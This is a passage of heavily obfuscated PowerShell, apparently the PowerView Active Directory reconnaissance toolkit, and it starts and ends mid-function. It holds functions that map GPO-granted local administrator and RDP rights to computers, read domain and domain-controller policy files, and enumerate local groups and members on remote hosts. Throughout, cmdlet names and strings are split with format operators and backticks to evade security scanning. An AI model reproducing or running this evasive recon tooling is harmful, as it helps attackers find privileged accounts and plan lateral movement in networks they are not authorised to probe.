        [Parameter(PoSItIOn = 0, paramETersetName = "cOMPUtE`Ri`De`NTi`Ty", MANdatorY = ${t`Rue}, VAluEFRoMpIPEline = ${TR`Ue}, VALUeFRoMpiPelINebYpropertYnAmE = ${t`RUe})]
        [Alias({"{2}{1}{0}" -f'ame','rN','Compute'}, {"{1}{0}{2}"-f 'o','C','mputer'}, {"{3}{0}{1}{2}"-f'istingui','shed','Name','D'}, {"{1}{3}{0}{2}" -f 'count','S','Name','amAc'}, {"{0}{1}" -f 'Na','me'})]
        [String]
        ${C`oMPute`RIdE`NT`Ity},

        [Parameter(MaNDatOrY = ${t`RUE}, ParamEtErSeTnaME = "O`Uide`NTitY")]
        [Alias('OU')]
        [String]
        ${O`U`I`dentITY},

        [String]
        [ValidateSet({"{2}{0}{3}{1}"-f 'dmin','trators','A','is'}, {"{1}{2}{0}"-f'-544','S','-1-5-32'}, 'RDP', {"{1}{4}{2}{0}{3}"-f 'ktop ','Remot','Des','Users','e '}, {"{2}{1}{0}"-f'55','-1-5-32-5','S'})]
        ${L`oCA`LGRo`UP} = ("{3}{2}{0}{4}{1}"-f 'mini','rators','d','A','st'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`MAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'A','h','DSPat'})]
        [String]
        ${SE`ARc`hB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}" -f'Domain','er','l','Control'})]
        [String]
        ${Se`RveR},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{0}{1}"-f'One','Level'}, {"{0}{1}"-f'Subt','ree'})]
        [String]
        ${S`EARc`HScoPe} = ("{0}{1}{2}" -f'S','ub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESUl`T`pA`GEsI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`erveRTi`MELIMIT},

        [Switch]
        ${TOmb`st`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`de`NTiAl} =   ${pK`FE`zN}::"em`PTY"
    )

    BEGIN {
        ${c`omMonAR`gu`MEnTS} = @{}
        if (${PSbo`U`Nd`pARametErs}[("{1}{0}" -f 'in','Doma')]) { ${C`o`mmOnARgUmen`Ts}[("{0}{1}" -f 'Do','main')] = ${DO`maIn} }
        if (${p`sb`oun`Dp`ARAMEtErS}[("{2}{1}{0}" -f 'rver','e','S')]) { ${c`O`m`monarguM`ENts}[("{0}{1}" -f 'Se','rver')] = ${S`erVER} }
        if (${PSb`oundpaRA`met`eRs}[("{0}{2}{1}" -f 'Search','pe','Sco')]) { ${c`OM`MOnaR`GUmEnTS}[("{0}{1}{3}{2}"-f'Sea','r','pe','chSco')] = ${sE`ArcHsC`opE} }
        if (${p`sBOUnd`Param`ET`erS}[("{1}{2}{0}" -f 'eSize','ResultPa','g')]) { ${C`oMMON`AR`gUmen`Ts}[("{2}{4}{3}{0}{1}"-f'S','ize','Resu','tPage','l')] = ${re`suL`T`pAGESize} }
        if (${ps`Bou`Nd`parAmETe`RS}[("{3}{2}{0}{1}"-f 'rverT','imeLimit','e','S')]) { ${Co`mm`onaR`GUMEnTs}[("{2}{0}{1}{3}" -f 'verTi','meL','Ser','imit')] = ${SE`RveRt`im`ELimiT} }
        if (${pSB`ou`NdP`AraM`ETERs}[("{2}{1}{0}" -f'e','n','Tombsto')]) { ${c`OM`mo`NA`RGuMeNts}[("{2}{1}{0}"-f 'stone','mb','To')] = ${tO`mb`ST`one} }
        if (${pSBounDP`A`RamE`TErs}[("{0}{1}{3}{2}"-f'Cre','d','tial','en')]) { ${Comm`On`Ar`gUMEN`Ts}[("{2}{0}{1}" -f 'redent','ial','C')] = ${CrED`E`N`TiAl} }
    }

    PROCESS {
        if (${psBoUnDPA`RaM`e`TErs}[("{1}{2}{4}{0}{3}"-f'entit','Comput','erI','y','d')]) {
            ${com`pUTE`Rs} = &("{1}{2}{0}{4}{3}{5}" -f 'o','Ge','t-D','C','main','omputer') @CommonArguments -Identity ${com`Pute`Ri`D`EnTITY} -Properties ("{7}{0}{3}{6}{8}{5}{1}{4}{2}"-f'ishe','st','ame','dn','n','nsho','ame','distingu',',d')

            if (-not ${C`OmP`U`TerS}) {
                throw ('['+'Get-'+'Doma'+'in'+'G'+'POComput'+'e'+'rL'+'ocal'+'GroupMapp'+'ing]'+' '+'Compute'+'r '+"$ComputerIdentity "+'not'+' '+'fou'+'nd. '+'T'+'ry '+'a '+'fu'+'lly '+'qualifi'+'ed'+' '+'ho'+'st '+'n'+'ame.')
            }

            ForEach (${COMP`U`Ter} in ${Co`Mp`UTE`RS}) {

                ${gp`Og`Uids} = @()

                ${dN} = ${comP`Ut`Er}."D`istINGuIsHE`D`NAmE"
                ${oUI`Nd`EX} = ${Dn}.("{1}{0}" -f'xOf','Inde').Invoke('OU=')
                if (${OUin`dex} -gt 0) {
                    ${O`UNamE} = ${DN}.("{0}{1}{2}"-f 'SubStr','i','ng').Invoke(${oUIN`deX})
                }
                if (${o`UnAMe}) {
                    ${GpO`Gui`dS} += &("{2}{1}{3}{0}" -f'U','ain','Get-Dom','O') @CommonArguments -SearchBase ${o`UNAMe} -LDAPFilter (("{1}{2}{0}" -f'=*)','(gpl','ink')) | &("{1}{0}{2}" -f'Eac','For','h-Object') {
                        &("{1}{3}{2}{0}"-f'g','Sel','ct-Strin','e') -InputObject ${_}."g`P`Link" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{0}{2}{1}{3}" -f'ForEac','-Obje','h','ct') {${_}."M`At`CHeS" | &("{1}{0}{2}" -f'ect-Obje','Sel','ct') -ExpandProperty ("{0}{1}" -f'Va','lue') }
                    }
                }

                &("{0}{2}{1}{4}{3}"-f'Wri','-','te','e','Verbos') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${c`Omp`UtersITE} = (&("{0}{4}{5}{3}{2}{1}{6}" -f'Get','t','rSi','etCompute','-','N','eName') -ComputerName ${C`OM`puTEr}."dNsh`ost`NAME")."S`ITEnAME"
                if (${cOmPUt`er`sI`Te} -and (${cOMpU`T`Er`Si`Te} -notmatch ("{0}{1}" -f'Er','ror'))) {
                    ${GPo`GUIDs} += &("{2}{1}{0}" -f 'inSite','-Doma','Get') @CommonArguments -Identity ${cOmp`U`Te`RS`itE} -LDAPFilter (("{1}{2}{0}" -f '=*)','(gpli','nk')) | &("{1}{0}{2}{3}"-f 'orEach','F','-O','bject') {
                        &("{3}{0}{4}{1}{2}"-f'elec','trin','g','S','t-S') -InputObject ${_}."g`pLInK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{0}{4}{3}{1}"-f'Ea','ct','For','bje','ch-O') {${_}."ma`T`ches" | &("{2}{1}{0}" -f'ject','ct-Ob','Sele') -ExpandProperty ("{0}{1}"-f'Valu','e') }
                    }
                }

                ${G`pOG`UIdS} | &("{1}{0}{3}{2}{4}" -f'mainG','Get-Do','alG','POLoc','roup') @CommonArguments | &("{0}{2}{3}{1}" -f 'Sor','t','t-Ob','jec') -Property ("{1}{2}{0}" -f'e','GPONa','m') -Unique | &("{0}{2}{1}{3}" -f 'ForEac','-','h','Object') {
                    ${GP`og`ROUP} = ${_}

                    if(${G`P`OGro`Up}."Gr`OUPmemB`e`Rs") {
                        ${G`Pomemb`E`Rs} = ${gpo`g`ROUp}."Gro`Up`MembE`Rs"
                    }
                    else {
                        ${gp`Omem`Be`Rs} = ${GPo`grOUP}."gROUP`s`Id"
                    }

                    ${GpO`M`em`Bers} | &("{1}{3}{0}{2}" -f'O','ForE','bject','ach-') {
                        ${Ob`JE`cT} = &("{3}{4}{2}{1}{0}"-f'mainObject','o','D','Get','-') @CommonArguments -Identity ${_}
                        ${I`SG`ROup} = @(("{3}{1}{0}{2}" -f'545','3','6','2684'),("{0}{1}" -f'2684','35457'),("{1}{0}{3}{2}" -f '6','53','70912','8'),("{2}{1}{0}"-f '3','91','536870')) -contains ${o`BjeCT}."samAC`COuN`T`TypE"

                        ${G`po`Co`MpU`TE`Rloc`AlGro`UPmEMb`eR} = &("{0}{1}{2}"-f'New-','Obj','ect') ("{2}{0}{1}" -f'bjec','t','PSO')
                        ${gpoCoMPUTERL`o`CaL`grou`pmem`Ber} | &("{2}{1}{0}{3}"-f'Memb','dd-','A','er') ("{0}{2}{1}"-f 'Note','erty','prop') ("{1}{2}{0}{3}" -f 'rN','Comp','ute','ame') ${com`P`U`Ter}."Dns`HO`STName"
                        ${GpOcoM`PUteR`lOCAL`G`ROupMEMbER} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{2}{3}{0}{1}"-f'rope','rty','Note','p') ("{0}{3}{2}{1}" -f'Objec','e','am','tN') ${ob`JECT}."S`AmaCC`Ou`NTnA`mE"
                        ${gPOcOM`put`E`Rl`ocAlg`RO`UpMe`MbER} | &("{1}{0}{2}" -f'dd-Membe','A','r') ("{3}{1}{2}{0}" -f'erty','ot','eprop','N') ("{0}{2}{1}" -f'O','DN','bject') ${ob`j`eCt}."dIsti`NguI`ShEDN`AmE"
                        ${GPO`C`om`Pu`TERlOcA`LGROu`pMemBeR} | &("{0}{2}{1}"-f 'Ad','er','d-Memb') ("{2}{0}{1}{3}"-f 'oper','t','Notepr','y') ("{0}{1}{2}" -f 'Ob','jectSI','D') ${_}
                        ${gpO`coMPu`T`ERLoCA`lGRoU`p`mEMbER} | &("{1}{0}{2}"-f 'dd','A','-Member') ("{1}{3}{2}{0}"-f 'operty','N','epr','ot') ("{0}{1}{2}"-f 'IsG','rou','p') ${is`G`ROUp}
                        ${G`pOC`omp`UtErl`o`C`ALGRoupmEm`BEr} | &("{0}{1}{3}{2}"-f 'A','dd-Mem','er','b') ("{2}{1}{3}{0}"-f'rty','otepro','N','pe') ("{1}{2}{0}"-f 'layName','GPODi','sp') ${GPO`gROup}."G`pOD`iSPLAYname"
                        ${gp`OCOm`P`U`TE`RLO`CaLGr`OU`pMeMBer} | &("{1}{2}{0}"-f 'er','Add','-Memb') ("{1}{0}{2}{3}" -f'otep','N','ro','perty') ("{0}{1}" -f 'GPOG','uid') ${Gp`O`GrOuP}."G`pON`AME"
                        ${GPOCOMPu`Te`R`locAL`gRo`UPmEMbeR} | &("{1}{2}{0}" -f'ber','Add-Me','m') ("{0}{2}{1}{3}" -f 'Not','per','epro','ty') ("{1}{0}" -f 'POPath','G') ${GP`Ogro`UP}."gp`OPa`TH"
                        ${gp`oCompU`Te`R`locAL`gRo`UPMembeR} | &("{3}{2}{0}{1}"-f'd-Mem','ber','d','A') ("{1}{0}{2}{3}" -f 'eprope','Not','r','ty') ("{0}{1}" -f 'GPOTyp','e') ${GPOG`Ro`Up}."G`poT`Ype"
                        ${gpOcO`MPut`E`RLocA`lGRoupME`MBER}."ps`ObJeCt"."Type`NA`mES".("{0}{1}"-f 'A','dd').Invoke(("{3}{6}{10}{8}{9}{4}{2}{0}{5}{7}{1}" -f'o','r','calGr','Power','rLo','u','View.','pMembe','ut','e','GPOComp'))
                        ${GP`o`CO`Mp`Ut`ERloC`ALGro`UPm`eMbeR}
                    }
                }
            }
        }
    }
}

function gE`T`-doMAi`NP`OLI`CyD`Ata {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}" -f'roces','SShouldP','P','s'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITIOn = 0, VAluefROmPIPelINE = ${T`RUE}, vALuEFrOmPipelinEByproPErTyname = ${T`RUE})]
        [Alias({"{1}{0}" -f 'rce','Sou'}, {"{1}{0}" -f'ame','N'})]
        [String]
        ${P`oli`cY} = ("{1}{0}" -f 'ain','Dom'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{4}{3}{1}"-f'Do','er','mainCo','oll','ntr'})]
        [String]
        ${SER`VEr},

        [ValidateRange(1, 10000)]
        [Int]
        ${servERtim`E`Li`MIt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`denT`IaL} =  ${P`K`FeZn}::"E`MpTY"
    )

    BEGIN {
        ${S`e`AR`c`HERar`GUmenTS} = @{}
        if (${Ps`BOUndpaR`AME`Te`Rs}[("{1}{0}"-f 'er','Serv')]) { ${se`Ar`C`hERARgu`meNTS}[("{1}{0}"-f 'erver','S')] = ${sEr`VER} }
        if (${pSboun`dpaR`A`MeT`ERs}[("{2}{1}{4}{0}{3}" -f'imi','erT','Serv','t','imeL')]) { ${SE`Arch`ErarGU`Me`NtS}[("{1}{0}{2}" -f'meLim','ServerTi','it')] = ${SE`RverTimE`L`I`Mit} }
        if (${Ps`Bo`UNDpAr`AmetE`RS}[("{2}{3}{1}{0}"-f 'l','dentia','Cr','e')]) { ${SeA`RC`Her`ARGUMEntS}[("{3}{0}{2}{1}" -f'reden','ial','t','C')] = ${C`R`E`DentiAL} }

        ${Co`NVERt`A`RG`Um`ENtS} = @{}
        if (${PSbOun`dP`ArAME`TE`RS}[("{0}{1}{2}" -f 'S','erv','er')]) { ${conve`RT`ARg`UMENts}[("{1}{0}{2}" -f'erv','S','er')] = ${sERV`ER} }
        if (${PSBO`UNDpA`RamE`TeRS}[("{0}{2}{1}"-f 'Creden','ial','t')]) { ${C`ONve`RTaR`GUmENTS}[("{1}{2}{0}"-f 'ial','Cre','dent')] = ${creD`En`T`IAL} }
    }

    PROCESS {
        if (${PSBouNdp`ArA`m`etE`Rs}[("{0}{1}{2}"-f 'Doma','i','n')]) {
            ${sE`Ar`cHerArGumE`NTS}[("{1}{0}"-f 'main','Do')] = ${doM`AIn}
            ${C`O`NvERTArGuMeN`TS}[("{0}{1}" -f'Dom','ain')] = ${D`OMa`In}
        }

        if (${POlI`cY} -eq 'All') {
            ${sEA`Rc`hErArgu`menTS}[("{1}{2}{0}"-f'ity','I','dent')] = '*'
        }
        elseif (${P`oLi`Cy} -eq ("{0}{1}" -f 'Domai','n')) {
            ${searcHer`A`RgUme`Nts}[("{1}{0}" -f'ity','Ident')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${pol`icy} -eq ("{3}{1}{4}{2}{0}" -f'r','ro','e','DomainCont','ll')) -or (${pOL`iCY} -eq 'DC')) {
            ${Se`Ar`cHeraRg`UM`EN`TS}[("{0}{2}{1}" -f 'Iden','y','tit')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${sE`ARChEr`A`RgumeNTS}[("{0}{1}{2}" -f'Ident','it','y')] = ${pO`li`Cy}
        }

        ${GPOR`esu`LtS} = &("{3}{1}{0}{2}" -f '-','et','DomainGPO','G') @SearcherArguments

        ForEach (${g`pO} in ${g`pOr`ESu`LtS}) {

            ${G`P`TTMPLpa`TH} = ${G`PO}."GPCF`iLESY`Sp`ATh" + ((("{4}{5}{9}{3}{6}{1}{2}{7}{10}{8}{0}" -f 'l.inf','oftdnJWindows N','Tdn','ic','dnJMAC','HIN','ros','JSecE','nJGptTmp','EdnJM','ditd'))-crepLaCe 'dnJ',[Char]92)

            ${P`Ar`SEa`Rgs} =  @{
                ("{2}{0}{1}" -f 'tTmplP','ath','Gp') = ${GP`TtM`PL`patH}
                ("{0}{1}{2}{3}"-f 'O','utputOb','je','ct') = ${t`Rue}
            }
            if (${pS`BoUND`p`ARa`meTers}[("{2}{3}{1}{0}" -f'al','i','Creden','t')]) { ${PaRS`E`Args}[("{0}{1}{2}" -f 'Crede','ntia','l')] = ${CR`e`d`EnTIal} }

            &("{0}{1}{3}{2}" -f'G','et','mpl','-GptT') @ParseArgs | &("{0}{3}{2}{1}"-f'ForE','t','h-Objec','ac') {
                ${_} | &("{2}{1}{0}{3}"-f 'e','mb','Add-Me','r') ("{2}{0}{1}{3}" -f 'rop','er','Notep','ty') ("{0}{1}{2}"-f'GP','O','Name') ${g`pO}."Na`me"
                ${_} | &("{2}{0}{1}"-f'Membe','r','Add-') ("{2}{1}{0}" -f 'ty','oper','Notepr') ("{4}{3}{2}{0}{1}" -f's','playName','Di','PO','G') ${G`po}."d`IsPL`AYN`AmE"
                ${_}
            }
        }
    }
}

function g`ET-`N`et`LoCAlGroUP {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}{4}" -f 'l','hou','dPro','PSS','cess'}, '')]
    [OutputType({"{0}{2}{1}{4}{3}" -f 'Pow','Grou','erView.Local','PI','p.A'})]
    [OutputType({"{3}{0}{1}{5}{4}{2}" -f 'rView.Loc','alG','nNT','Powe','.Wi','roup'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosITIon = 0, VaLUefrompipElINe = ${t`Rue}, vAluEfROmPiPEliNEByprOpeRtYnamE = ${T`RUe})]
        [Alias({"{2}{0}{1}" -f 'ostN','ame','H'}, {"{2}{0}{3}{1}" -f 'st','me','dnsho','na'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`Omp`Ut`ername} = ${e`N`V:COMpUTER`Na`mE},

        [ValidateSet('API', {"{0}{1}" -f 'WinN','T'})]
        [Alias({"{0}{1}{2}{3}" -f 'Co','l','lec','tionMethod'})]
        [String]
        ${M`eTHoD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`E`NtiAL} =   ( &("{1}{0}"-f 'lDItEm','CHI') ("VaRiABle"+":"+"PkF"+"Ez"+"N") )."vA`LuE"::"emp`Ty"
    )

    BEGIN {
        if (${pS`BO`UNDpa`R`Am`EteRs}[("{1}{0}{2}{3}" -f'r','C','edentia','l')]) {
            ${LO`GO`NT`oken} = &("{4}{3}{1}{0}{2}"-f 'a','person','tion','UserIm','Invoke-') -Credential ${crE`D`Enti`AL}
        }
    }

    PROCESS {
        ForEach (${CoMpU`TER} in ${C`omPuT`er`NaMe}) {
            if (${meTh`Od} -eq 'API') {

                ${Q`U`EryLEvEl} = 1
                ${p`TrIn`Fo} =  ${HdI`cu}::"z`ErO"
                ${Entr`ie`s`ReaD} = 0
                ${tOTa`lre`AD} = 0
                ${re`su`m`Eh`ANdLE} = 0

                ${REsu`Lt} = ${N`ETA`PI32}::"nEt`L`OCAlgRo`UPEn`Um"(${C`OmpU`TEr}, ${qUerY`LE`V`eL}, [ref]${pt`RIN`FO}, -1, [ref]${EnT`Ri`Esr`eAd}, [ref]${TOT`A`lR`EAd}, [ref]${r`ES`UmehANd`le})

                ${off`set} = ${p`TRi`NFO}.("{0}{1}{2}"-f 'ToI','nt6','4').Invoke()

                if ((${re`s`Ult} -eq 0) -and (${oF`FsET} -gt 0)) {

                    ${i`NCRE`m`enT} = ${lO`ca`lGROuP_`inFO_1}::("{0}{2}{1}"-f 'Ge','ize','tS').Invoke()

                    for (${i} = 0; (${i} -lt ${ENTR`iE`srEaD}); ${i}++) {

                        ${N`eWINtp`Tr} = &("{0}{1}{2}{3}"-f'N','ew-','O','bject') ("{1}{2}{0}"-f'tr','System.I','ntp') -ArgumentList ${of`FsEt}
                        ${iN`Fo} = ${NEw`IN`TPtR} -as ${L`o`CalgrOUp_INf`O_1}

                        ${OF`FsET} = ${n`EwIN`TPtr}.("{1}{0}"-f 'Int64','To').Invoke()
                        ${O`FF`sEt} += ${iNcrem`e`NT}

                        ${lOc`AL`GrO`Up} = &("{1}{2}{0}" -f'bject','N','ew-O') ("{2}{1}{0}"-f'Object','S','P')
                        ${lOc`ALG`RoUp} | &("{2}{1}{0}" -f'er','Memb','Add-') ("{2}{0}{1}{3}"-f 'otepr','ope','N','rty') ("{1}{0}{2}{3}"-f'uterNa','Comp','m','e') ${c`omPut`ER}
                        ${L`ocA`lgROUP} | &("{0}{2}{3}{1}" -f 'Add','er','-Me','mb') ("{3}{0}{2}{1}"-f 'eprop','ty','er','Not') ("{1}{2}{0}"-f'e','Grou','pNam') ${in`FO}."lg`RPI`1_Na`Me"
                        ${lo`CaLg`Ro`Up} | &("{0}{1}{2}"-f'Add','-Mem','ber') ("{0}{2}{1}"-f 'N','operty','otepr') ("{0}{1}"-f'Co','mment') ${IN`Fo}."LgRpi`1_cO`mME`NT"
                        ${lOca`l`GROUp}."Pso`Bj`Ect"."T`yPENA`Mes".("{2}{0}{1}" -f 'se','rt','In').Invoke(0, ("{1}{2}{3}{0}{5}{4}"-f 'calGrou','PowerVi','e','w.Lo','API','p.'))
                        ${LoCA`lG`R`oUp}
                    }

                    ${nU`LL} = ${nEtap`I`32}::("{1}{0}{3}{2}" -f 'etApi','N','ree','BufferF').Invoke(${P`Tri`Nfo})
                }
                else {
                    &("{1}{2}{0}{3}"-f 'e','Write','-V','rbose') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {

                ${cOmP`Uterp`ROv`i`DER} = [ADSI]"WinNT://$Computer,computer"

                ${CO`Mpute`RPr`OvId`ER}."PS`B`AsE"."ch`I`ldreN" | &("{0}{3}{1}{2}" -f 'Where-O','j','ect','b') { ${_}."P`S`BASe"."s`C`h`EMAc`LASsNaME" -eq ("{1}{0}" -f'oup','gr') } | &("{2}{0}{1}{3}" -f'E','ac','For','h-Object') {
                    ${loC`AlGrO`Up} = ([ADSI]${_})
                    ${GrO`Up} = &("{2}{0}{1}"-f 'bje','ct','New-O') ("{2}{1}{0}"-f'ct','Obje','PS')
                    ${gRO`UP} | &("{0}{2}{1}"-f 'A','r','dd-Membe') ("{3}{1}{0}{2}" -f 'proper','ote','ty','N') ("{2}{1}{0}"-f'ame','puterN','Com') ${CO`MP`UteR}
                    ${gRO`UP} | &("{0}{2}{1}" -f 'A','ber','dd-Mem') ("{1}{0}{2}{3}"-f 'p','Notepro','ert','y') ("{2}{1}{0}"-f 'e','oupNam','Gr') (${locA`l`grOUp}.("{1}{0}{2}"-f'voke','In','Get').Invoke(("{0}{1}" -f 'N','ame')))
                    ${G`RoUp} | &("{0}{2}{1}" -f'Add-','r','Membe') ("{2}{0}{3}{1}" -f 'ot','erty','N','eprop') 'SID' ((&("{2}{3}{0}{1}" -f'bje','ct','New-','O') ("{1}{10}{0}{8}{9}{2}{3}{7}{4}{6}{5}"-f 'ste','S','it','y','nc','entifier','ipal.SecurityId','.Pri','m.Se','cur','y')(${LOc`Al`gR`OUp}.("{0}{1}{2}"-f 'Invoke','G','et').Invoke(("{2}{0}{1}"-f 'si','d','object')),0))."vA`Lue")
                    ${G`R`OUP} | &("{1}{0}{2}"-f'-Memb','Add','er') ("{1}{0}{2}" -f'rop','Notep','erty') ("{0}{2}{1}"-f'Co','t','mmen') (${l`OCaLgR`oUp}.("{1}{2}{0}"-f't','Invoke','Ge').Invoke(("{0}{3}{2}{1}" -f 'Descri','on','i','pt')))
                    ${g`ROUP}."PS`O`BJECT"."T`yP`EN`AmES".("{0}{1}"-f'Ins','ert').Invoke(0, ("{2}{0}{4}{3}{1}" -f'e','WinNT','PowerVi','oup.','w.LocalGr'))
                    ${Gro`UP}
                }
            }
        }
    }

    END {
        if (${lOgO`N`Token}) {
            &("{1}{3}{0}{4}{5}{2}"-f '-Re','I','lf','nvoke','ver','tToSe') -TokenHandle ${L`oG`ONt`OKeN}
        }
    }
}

function g`et-`Ne`TlOCAl`GroupM`eMb`er {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f'Sho','Process','PS','uld'}, '')]
    [OutputType({"{2}{5}{0}{4}{3}{1}" -f 'L','ber.API','Powe','oupMem','ocalGr','rView.'})]
    [OutputType({"{0}{2}{1}{7}{3}{6}{5}{4}"-f'Powe','w.L','rVie','lGroupMe','T','nN','mber.Wi','oca'})]
    Param(
        [Parameter(POsITION = 0, VaLUEfrOMPIpElIne = ${Tr`Ue}, VALUEfRoMPipeliNEbYprOPeRTynAMe = ${Tr`UE})]
        [Alias({"{0}{1}{2}" -f 'H','ostNa','me'}, {"{1}{2}{0}" -f 'ame','d','nshostn'}, {"{0}{1}"-f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOm`pU`T`ERnAmE} = ${E`N`V:CoMpU`TErnAMe},

        [Parameter(vALuEfRomPipElinebYprOpERtynAmE = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${g`RoUP`NAMe} = ("{2}{0}{1}{3}" -f 'dm','inistrato','A','rs'),

        [ValidateSet('API', {"{0}{1}"-f 'Win','NT'})]
        [Alias({"{2}{0}{3}{1}" -f 'nM','hod','Collectio','et'})]
        [String]
        ${m`Et`Hod} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedeN`T`IaL} =  ${PKF`e`zN}::"eMp`TY"
    )

    BEGIN {
        if (${PSb`ounDp`A`RamE`TERs}[("{1}{0}{2}"-f 'tia','Creden','l')]) {
            ${L`OGOn`TO`Ken} = &("{3}{2}{4}{0}{1}" -f'o','n','e-Use','Invok','rImpersonati') -Credential ${Cr`e`dEnTI`AL}
        }
    }

    PROCESS {
        ForEach (${CO`mpu`T`ER} in ${co`MpUtE`RnAME}) {
            if (${mE`T`HOD} -eq 'API') {

                ${Q`Ue`RYLEV`El} = 2
                ${P`TR`INfo} =  ( &('Ls') ("{3}{0}{2}{1}{4}" -f'Ar','HdI','IAblE:','V','Cu'))."va`lUe"::"ZE`Ro"
                ${E`NTRIesRe`Ad} = 0
                ${T`otalR`eAD} = 0
                ${RES`UMe`Ha`NdlE} = 0

                ${r`E`SUlt} = ${ne`Tapi`32}::"N`ETLocalGr`OuPGe`TME`MbERs"(${co`mp`UTer}, ${Gr`o`UPNA`mE}, ${qUeRy`LeV`El}, [ref]${PT`RiN`Fo}, -1, [ref]${e`Nt`RiEsReAD}, [ref]${tota`L`READ}, [ref]${REsUmeha`N`d`LE})

                ${Off`set} = ${P`TR`iNfo}.("{0}{1}" -f'ToInt','64').Invoke()

                ${me`mB`ers} = @()

                if ((${R`esU`LT} -eq 0) -and (${O`FfsEt} -gt 0)) {

                    ${i`NCR`EM`eNt} = ${L`O`CALgRo`UP_mem`BErs_In`Fo`_2}::("{2}{0}{1}" -f'e','tSize','G').Invoke()

                    for (${I} = 0; (${i} -lt ${entR`IE`sre`AD}); ${I}++) {

                        ${N`EwIn`TpTR} = &("{0}{2}{1}" -f 'N','bject','ew-O') ("{0}{3}{4}{1}{2}" -f 'S','em.Intp','tr','y','st') -ArgumentList ${O`FfsEt}
                        ${i`NfO} = ${N`Ew`iNtPtR} -as ${loCa`lG`Ro`Up_`Me`m`BErS_Info_2}

                        ${oF`Fs`et} = ${n`E`wIntptr}.("{0}{1}{2}" -f'To','I','nt64').Invoke()
                        ${OFFS`et} += ${I`NCr`emeNt}

                        ${sidst`Ri`Ng} = ''
                        ${R`ES`ULt2} = ${a`DVA`PI32}::"c`ON`VE`RT`Si`DTosTrINg`sID"(${I`NFO}."l`grmI`2_SId", [ref]${S`I`DSTRiNG});${Las`Te`RroR} =   ${dU`R8}::("{1}{4}{3}{0}{2}"-f'r','G','or','in32Er','etLastW').Invoke()

                        if (${Res`U`LT2} -eq 0) {
                            &("{3}{0}{4}{2}{1}"-f'e','bose','er','Writ','-V') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${MEMB`eR} = &("{1}{0}{2}" -f'ew-','N','Object') ("{2}{1}{0}"-f'ject','b','PSO')
                            ${me`MBer} | &("{2}{0}{1}"-f'mb','er','Add-Me') ("{3}{1}{0}{2}" -f'r','rope','ty','Notep') ("{3}{1}{2}{0}"-f'rName','pu','te','Com') ${COMP`U`TEr}
                            ${mE`MBEr} | &("{0}{2}{1}" -f'Ad','mber','d-Me') ("{3}{1}{2}{0}" -f 'erty','o','p','Notepr') ("{1}{0}{2}" -f 'upNa','Gro','me') ${gR`oU`pNA`mE}
                            ${m`emb`er} | &("{0}{2}{1}"-f'Add-','ember','M') ("{1}{2}{0}{3}" -f'pe','Notep','ro','rty') ("{1}{0}{2}"-f 'mberNam','Me','e') ${I`NfO}."LgRmI2_D`oMAiNa`N`dNA`me"
                            ${MEm`B`ER} | &("{0}{1}{2}" -f 'A','dd-Membe','r') ("{2}{1}{0}"-f 'perty','ro','Notep') 'SID' ${SIDsT`R`ING}
                            ${iSgr`o`UP} = $(${i`NFO}."lgrmI2_`S`Idusa`ge" -eq ("{2}{3}{0}{1}" -f'ou','p','SidT','ypeGr'))
                            ${Me`MB`er} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') ("{1}{0}{2}{3}" -f 'ot','N','epro','perty') ("{0}{1}"-f'IsGro','up') ${is`gRO`Up}
                            ${M`e`mBEr}."PsoB`J`ect"."t`yPeNaMEs".("{1}{0}" -f'rt','Inse').Invoke(0, ("{8}{2}{0}{1}{7}{9}{6}{3}{4}{5}"-f 'werView.L','ocalG','o','ber','.','API','em','rou','P','pM'))
                            ${m`e`MBErS} += ${mE`mB`er}
                        }
                    }

                    ${n`UlL} = ${netA`Pi`32}::("{0}{1}{3}{2}" -f 'NetA','pi','ree','BufferF').Invoke(${Pt`RIN`Fo})

